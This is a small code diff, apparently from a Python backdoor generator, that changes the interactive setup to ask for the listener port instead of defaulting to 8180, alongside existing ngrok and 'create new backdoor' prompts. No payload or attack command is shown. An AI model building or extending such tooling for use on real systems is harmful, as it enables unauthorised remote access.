@@ -562,7 +562,8 @@ def get_argv():
         print(backdoor321_title)
         print('[*]Run it by using default setting :')
         print('-[*]IP : 127.0.0.1')
-        print('-[*]Port : 8180')
+        print('-[*]Port : ',end='')
+        _port = int(input())
         print('-[*]Ngrok (True/False) [Default : False] : ',end='')
         _ngrok = input()
         print('-[*]Create New Backdoor? [Default : False] : ',end='')
@@ -583,7 +584,7 @@ def get_argv():
         else:
             manyvi = False
 
-        main_func('',8180,ngrok,creation,manyvi)
+        main_func('',_port,ngrok,creation,manyvi)
         
 
 
